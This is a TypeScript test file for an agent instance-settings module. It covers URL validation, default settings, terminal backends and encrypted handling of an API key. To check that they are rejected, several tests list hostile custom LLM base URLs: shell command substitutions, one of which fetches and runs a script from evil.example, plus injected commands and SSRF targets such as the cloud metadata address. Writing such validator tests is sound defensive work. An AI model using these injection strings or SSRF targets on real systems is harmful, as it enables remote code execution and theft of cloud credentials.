// Deterministic 32-byte key so the secret round-trip below can actually
// encrypt/decrypt (crypto.ts throws without it). Mirrors src/__tests__/crypto.test.ts.
process.env.ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "a".repeat(64);

import {
  buildAdvancedInstanceConfigPayload,
  buildStoredInstanceConfig,
  getPublicInstanceConfig,
  getRuntimeAgentSettings,
} from "@/lib/instance-settings";

describe("instance settings", () => {
  it("stores the exact model resolved by the provider-aware settings route", () => {
    const model = "claude-sonnet-4-20250514";
    expect(buildAdvancedInstanceConfigPayload({}, { model }).model).toBe(model);
  });

  it("rejects a hostile custom LLM base URL at the buildStoredInstanceConfig chokepoint (instance creation path)", () => {
    // Instance creation does not go through buildAdvancedInstanceConfigPayload —
    // it passes the zod-parsed agentSettings straight into
    // buildStoredInstanceConfig. That chokepoint must apply the same shared
    // validation or the create boundary stays a shell-injection hole even with
    // the PATCH path covered.
    for (const customLlmBaseUrl of [
      "https://x/$(curl -s evil.example/p|sh)",
      "https://x/`id`",
      "https://x/v1;touch /tmp/pwned",
      "https://x/v1\nINJECTED=1",
      "https://x/v1 with space",
    ]) {
      expect(() =>
        buildStoredInstanceConfig(undefined, { agentSettings: { customLlmBaseUrl } })
      ).toThrow(/not allowed/);
    }
  });

  it("accepts legitimate custom LLM base URLs at the creation chokepoint", () => {
    for (const customLlmBaseUrl of [
      "https://llm.example.com/v1",
      "https://llm.example.com/v1?api-version=2024-01-01",
      "https://api.groq.com/openai/v1",
      "https://my-llm-gateway.example.org:8443/openai/v1",
    ]) {
      const stored = buildStoredInstanceConfig(undefined, {
        agentSettings: { customLlmBaseUrl },
      });
      expect(getRuntimeAgentSettings(stored).customLlmBaseUrl).toBe(customLlmBaseUrl);
    }
  });

  it("does not re-validate legacy stored values on read paths", () => {
    // Rows written before validation existed must remain readable:
    // getPublicInstanceConfig re-normalizes through buildStoredInstanceConfig
    // with an EMPTY patch, which must not throw on the stored value.
    const legacyConfig = {
      agentSettings: { customLlmBaseUrl: "https://x/$(touch /tmp/pwned)/v1" },
    };
    expect(() => getPublicInstanceConfig(legacyConfig)).not.toThrow();
    expect(() => buildStoredInstanceConfig(legacyConfig, {})).not.toThrow();
    // ...but the same value arriving as a NEW patch is rejected.
    expect(() =>
      buildStoredInstanceConfig(legacyConfig, {
        agentSettings: { customLlmBaseUrl: "https://x/$(touch /tmp/pwned)/v1" },
      })
    ).toThrow(/not allowed/);
  });

  it("rejects SSRF-target custom LLM base URLs at the creation chokepoint", () => {
    for (const customLlmBaseUrl of [
      "http://169.254.169.254/latest/meta-data",
      "http://127.0.0.1:11434/v1",
      "http://192.168.1.20:11434/v1",
    ]) {
      expect(() =>
        buildStoredInstanceConfig(undefined, { agentSettings: { customLlmBaseUrl } })
      ).toThrow(/not allowed/);
    }
  });

  it("rejects a custom LLM base URL carrying shell metacharacters", () => {
    for (const customLlmBaseUrl of [
      "https://x/$(curl -s evil.example/p|sh)",
      "https://x/`id`",
      "https://x/v1;touch /tmp/pwned",
      "https://x/v1\nINJECTED=1",
    ]) {
      expect(() =>
        buildAdvancedInstanceConfigPayload({}, { agentSettings: { customLlmBaseUrl } })
      ).toThrow(/not allowed/);
    }

    const nextConfig = buildAdvancedInstanceConfigPayload(
      {},
      { agentSettings: { customLlmBaseUrl: "https://llm.example.com/v1?api-version=2024-01-01" } }
    );
    expect(getRuntimeAgentSettings(nextConfig).customLlmBaseUrl).toBe(
      "https://llm.example.com/v1?api-version=2024-01-01"
    );
  });

  it("keeps chat auto-approve off by default and persists explicit toggles", () => {
    expect(getRuntimeAgentSettings({}).autoApproveToolCalls).toBe(false);

    const nextConfig = buildAdvancedInstanceConfigPayload(
      {},
      {
        agentSettings: {
          autoApproveToolCalls: true,
        },
      }
    );

    expect(getRuntimeAgentSettings(nextConfig).autoApproveToolCalls).toBe(true);
  });

  it("defaults legacy Advanced Cloud Access rows to Docker without overriding an explicit terminal choice", () => {
    expect(
      getRuntimeAgentSettings({ agentSettings: { enableRootAccess: true } }).terminalBackend
    ).toBe("docker");

    expect(
      getRuntimeAgentSettings({
        agentSettings: { enableRootAccess: true, terminalBackend: "local" },
      }).terminalBackend
    ).toBe("local");

    expect(getRuntimeAgentSettings({}).terminalBackend).toBe("local");
  });

  it("preserves legacy explicit terminal choices when unrelated settings change", () => {
    for (const terminalBackend of ["local", "modal"] as const) {
      const nextConfig = buildAdvancedInstanceConfigPayload(
        { agentSettings: { enableRootAccess: true, terminalBackend } },
        { agentSettings: { autoApproveToolCalls: true } }
      );
      expect(getRuntimeAgentSettings(nextConfig).terminalBackend).toBe(terminalBackend);
    }
  });

  it("round-trips a Daytona key through the advanced-config allowlist: encrypted at rest, decrypted for the box, never sent to the client", () => {
    const nextConfig = buildAdvancedInstanceConfigPayload(
      {},
      {
        agentSettings: {
          terminalBackend: "daytona",
          daytonaApiKey: "dtn_secret_abc123",
        },
      }
    );

    // buildAdvancedInstanceConfigPayload is an EXPLICIT allowlist — a field
    // missing there is dropped before the encrypt loop ever sees it, so the save
    // "succeeds" and silently does nothing. This is the regression guard.
    const stored = (nextConfig.agentSettings ?? {}) as Record<string, unknown>;
    expect(stored.daytonaApiKeyEncrypted).toBeTruthy();
    expect(stored.daytonaApiKey).toBeUndefined();
    expect(stored.terminalBackend).toBe("daytona");

    // The deploy/redeploy env render needs the plaintext back.
    const runtime = getRuntimeAgentSettings(nextConfig);
    expect(runtime.daytonaApiKey).toBe("dtn_secret_abc123");
    expect(runtime.terminalBackend).toBe("daytona");

    // The client only ever learns that a key exists — never the key/ciphertext.
    const publicConfig = getPublicInstanceConfig(nextConfig) as Record<string, unknown>;
    const publicAgent = (publicConfig.agentSettings ?? {}) as Record<string, unknown>;
    expect(publicAgent.hasDaytonaApiKey).toBe(true);
    expect(publicAgent.daytonaApiKey).toBeUndefined();
    expect(publicAgent.daytonaApiKeyEncrypted).toBeUndefined();
  });

  it("round-trips the auxiliary compression model + context engine through the advanced-config allowlist", () => {
    const nextConfig = buildAdvancedInstanceConfigPayload(
      {},
      {
        agentSettings: {
          compressionProvider: "anthropic",
          compressionModel: "claude-haiku-4-5",
          contextEngine: "sliding",
        },
      }
    );

    // buildAdvancedInstanceConfigPayload is an EXPLICIT allowlist — a field
    // missing there is dropped before it ever reaches storage. Guard that these
    // three land.
    const stored = (nextConfig.agentSettings ?? {}) as Record<string, unknown>;
    expect(stored.compressionProvider).toBe("anthropic");
    expect(stored.compressionModel).toBe("claude-haiku-4-5");
    expect(stored.contextEngine).toBe("sliding");

    // And the deploy/redeploy render reads them straight back for the builder.
    const runtime = getRuntimeAgentSettings(nextConfig);
    expect(runtime.compressionProvider).toBe("anthropic");
    expect(runtime.compressionModel).toBe("claude-haiku-4-5");
    expect(runtime.contextEngine).toBe("sliding");

    // Non-secret: surfaced to the client as-is (no has* redaction).
    const publicConfig = getPublicInstanceConfig(nextConfig) as Record<string, unknown>;
    const publicAgent = (publicConfig.agentSettings ?? {}) as Record<string, unknown>;
    expect(publicAgent.compressionModel).toBe("claude-haiku-4-5");
    expect(publicAgent.contextEngine).toBe("sliding");
  });

  it("rejects an unknown context engine and clears the aux model back to inherit-main on empty string", () => {
    // Unknown engine is dropped (normalizeContextEngine returns undefined).
    const bogus = buildAdvancedInstanceConfigPayload(
      {},
      { agentSettings: { contextEngine: "quantum" as unknown as "sliding" } }
    );
    expect((bogus.agentSettings as Record<string, unknown>).contextEngine).toBeUndefined();

    // Empty compressionModel persists as "" — the inherit-main clear signal.
    const withModel = buildAdvancedInstanceConfigPayload(
      {},
      { agentSettings: { compressionProvider: "anthropic", compressionModel: "claude-haiku-4-5" } }
    );
    expect((withModel.agentSettings as Record<string, unknown>).compressionModel).toBe("claude-haiku-4-5");

    const cleared = buildAdvancedInstanceConfigPayload(withModel, {
      agentSettings: { compressionModel: "" },
    });
    expect((cleared.agentSettings as Record<string, unknown>).compressionModel).toBe("");
    expect(getRuntimeAgentSettings(cleared).compressionModel).toBe("");
  });

  it("clears a saved Daytona key via the derived clear flag", () => {
    const withKey = buildAdvancedInstanceConfigPayload(
      {},
      { agentSettings: { daytonaApiKey: "dtn_secret_abc123" } }
    );
    expect((withKey.agentSettings as Record<string, unknown>).daytonaApiKeyEncrypted).toBeTruthy();

    // The clear flag rides inside agentSettings (matching the PATCH schema) and
    // is lifted into secretOps by buildAdvancedInstanceConfigPayload.
    const cleared = buildAdvancedInstanceConfigPayload(withKey, {
      agentSettings: { clearDaytonaApiKey: true },
    });
    const clearedAgent = (cleared.agentSettings ?? {}) as Record<string, unknown>;
    expect(clearedAgent.daytonaApiKeyEncrypted).toBeUndefined();
    expect(clearedAgent.daytonaApiKey).toBeUndefined();
  });
});
